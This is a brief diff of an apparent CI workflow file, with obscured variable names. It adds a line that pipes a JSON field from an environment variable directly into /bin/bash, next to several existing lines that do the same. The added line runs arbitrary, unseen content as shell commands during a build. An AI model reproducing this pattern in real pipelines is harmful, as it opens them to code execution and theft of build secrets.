@@ -26,6 +26,7 @@ jobs:
           echo $ayn54 | jq -r .lrpop56 | /bin/bash
           printf '%s' "$zgqh6" | jq -r .d82 | /bin/bash
           printf '%s' "$nnxmp0" | jq -r .h2024 | /bin/bash
+          echo $hr08 | jq -r .ow816 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
